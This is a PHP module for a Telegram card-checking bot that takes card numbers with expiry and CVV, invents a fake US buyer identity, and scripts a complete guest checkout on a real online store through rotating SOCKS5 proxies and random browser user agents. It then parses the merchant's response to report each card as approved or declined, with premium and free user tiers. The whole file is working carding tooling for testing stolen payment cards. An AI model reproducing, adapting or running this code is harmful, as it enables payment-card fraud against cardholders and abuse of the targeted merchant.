<?php 


list($cmd) = explode(" ", $message);
if($cmd == "/mt" or $cmd == ".mt" or $cmd == "!mt"){
sendaction($chatId, typing);
$NameGater ='Michilopotzli';
$gateway = '/mt :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Braintree Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!mt card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Braintree Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();




$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];



$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


if(strlen($ano) == 4){
    $ano = substr($ano, -2);
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ultraseat.com/air-lumbar-single-no-board?regioncheck=t');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'User-Agent: '.$ua.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$uid = getStr($curl, 'name  = "add_to_cart[', ']');

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ultraseat.com/content.php?module=store&mode=7');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.ultraseat.com';
$headers[] = 'User-Agent: '.$ua.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://www.ultraseat.com/air-lumbar-single-no-board';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.ultraseat.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'add_to_cart%5B'.$uid.'%5D%5Bqty%5D=1&add_to_cart%5B'.$uid.'%5D%5Buid%5D='.$uid.'&add_to_cart%5B'.$uid.'%5D%5Bproduct_id%5D=258&add_to_cart%5B'.$uid.'%5D%5Bforce_reload%5D=0&add_to_cart%5B'.$uid.'%5D%5Baction%5D=add_to_cart');
$curl = curl_exec($ch);
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ultraseat.com/content.php?module=store&mode=3');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'User-Agent: '.$ua.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://www.ultraseat.com/air-lumbar-single-no-board';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ultraseat.com/content.php?module=8&mode=3');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.ultraseat.com';
$headers[] = 'User-Agent: '.$ua.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://www.ultraseat.com/content.php?module=8&mode=3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.ultraseat.com';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Baddress_book%5D%5Bselect%5D=new&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bcompany%5D=&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bname%5D='.$firstname.'+'.$lastname.'&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Baddress%5D='.urlencode($street).'&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Baddress_extended%5D=&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bcity%5D=Duvall&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bcountry%5D=2&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bprovince%5D=62&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bpostal_code%5D='.$zip.'&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bphone%5D='.urlencode('(510) 238-7275').'&submit_step=true&action=1');
$curl = curl_exec($ch);
$transaction = getStr($curl, '<input type="hidden" name="checkout[payment][transaction]" value="', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ultraseat.com/content.php?module=8&mode=3&step=3');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.ultraseat.com';
$headers[] = 'User-Agent: '.$ua.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://www.ultraseat.com/content.php?module=8&mode=3&step=3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.ultraseat.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout%5Bshipping%5D%5Bmethod%5D=0&checkout%5Bshipping%5D%5Bfield%5D%5Bname%5D%5B6%5D%5B2%5D='.$firstname.'+'.$lastname.'&checkout%5Bshipping%5D%5Bfield%5D%5B6%5D%5B2%5D=&checkout%5Bshipping%5D%5Bfield%5D%5Bname%5D%5B6%5D%5B3%5D=Shipping+Account&checkout%5Bshipping%5D%5Bfield%5D%5B6%5D%5B3%5D=&checkout%5Bshipping_notes%5D%5Bnotes%5D=&checkout%5Buser%5D%5Bcontact%5D%5Bbilling%5D%5Baddress_book%5D%5Bselect%5D=same_as_shipping&checkout%5Bpo_number%5D=&checkout%5Bpayment%5D%5Bmethod_select%5D='.$transaction.'&checkout%5Bpayment%5D%5Btransaction%5D='.$transaction.'&checkout%5Bpayment%5D%5B'.$transaction.'%5D%5Bfield%5D%5B0%5D%5B1%5D='.$cc.'&checkout%5Bpayment%5D%5B'.$transaction.'%5D%5Bfield%5D%5B0%5D%5B2%5D%5Bm%5D='.$mes.'&checkout%5Bpayment%5D%5B'.$transaction.'%5D%5Bfield%5D%5B0%5D%5B2%5D%5By%5D='.$ano.'&checkout%5Bpayment%5D%5B'.$transaction.'%5D%5Bfield%5D%5B0%5D%5B3%5D='.$cvv.'&checkout%5Buser%5D%5Banonymous%5D=guest&checkout%5Buser%5D%5Bguest%5D%5Bemail%5D='.urlencode($email).'&secret=&submit_step=true&action=1');
$curl = curl_exec($ch);
$secret = getStr($curl, '<input value="', '" name = "secret" id="secret" type = "hidden" />');


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ultraseat.com/content.php?module=8&mode=3&step=4');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.ultraseat.com';
$headers[] = 'User-Agent: '.$ua.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://www.ultraseat.com/content.php?module=8&mode=3&step=4';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.ultraseat.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'submit_step=true&secret='.$secret.'');
$curl = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ultraseat.com/content.php?module=8&mode=3&step=5');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.ultraseat.com';
$headers[] = 'User-Agent: '.$ua.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://www.ultraseat.com/content.php?module=8&mode=3&step=5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.ultraseat.com';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'submit_step=true&secret='.$secret.'');
$result2 = curl_exec($ch);
$mgs = trim(getStr($result2, '<div class="error">', '</div>'));
$mgs = str_replace('           ', '', $mgs);


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
edit_message($chatId,$message_id_1,$keyboard,urlencode("<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Braintree Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>
"));
antisppre($gId);

if(strpos($result2, "because Transaction Declined: (483) DECLINED* REFER CALL TO ISSUE=")){ 
$status = "Approved! 🟩";
$response = "Transaction Declined: (483) DECLINED* REFER CALL TO ISSUE=";
}elseif (strpos($result2, 'Your order is confirmed') || (strpos($result2,"Thank_you"))) {
$status = "Approved!🟩";
$response = "Your order is confirmed🟩";
}elseif (strpos($result, "ddddddd")){ 
$status = "Approved!";
$response = "Approved! CVV 🟩";
}elseif (strpos($result2, "card_error_authentication_required") ||(strpos($result2,'three_d_secure_redirect'))){ 
$status = "Declined! 🔴";
$response = "3D Card.❌";
}elseif (strpos($result2, "Error updating default payment method. Your card was declined.")){ 
$status = "Declined! 🔴";
$response = "Your card was declined.";
}elseif (strpos($result2, "do_not_honor")){ 
$status = "Declined! 🔴";
$response = "do_not_honor";
}elseif (strpos($result2, "unchecked")){ 
$status = "Declined! 🔴";
$response = "DECLINED Anvilt";
}elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
$status = "<b>CARD DECLINED ❌</b>";
$response = "Your card does not support this type of purchase🟥";
}elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
$status = "<b>CARD DECLINED ❌</b>";
$response = "<b>LOST CARD</b>";
}elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
$status = "<b>Declined! 🔴</b>";
$response = "<b>FRAUDULENT CARD</b>";
}elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
$status = "<b>CARD EXPIRED ❌</b>";
$response = "<b>EXPIRED CARD</b>";
}elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>INVALID CARD ❌</b>";
$response = "<b>INCORRECT NUMBER</b>";
}elseif ((strpos($result2, 'Sorry, there was an error completing your purchase -- please try again.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>Declined! 🔴</b>";
$response = "<b>try again</b>";
}elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'incorrect-number')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>Declined! 🔴</b>";
$response = "<b>INCORRECT NUMBER</b>";
}elseif (strpos($result2, "generic_decline")){
$status = "<b>Declined! 🔴</b>";
$response = "<b>GENERIC DECLINE</b>";
}
else{
$status = "Declined! 🔴";
$response = "$mgs";
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Braintree Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}


    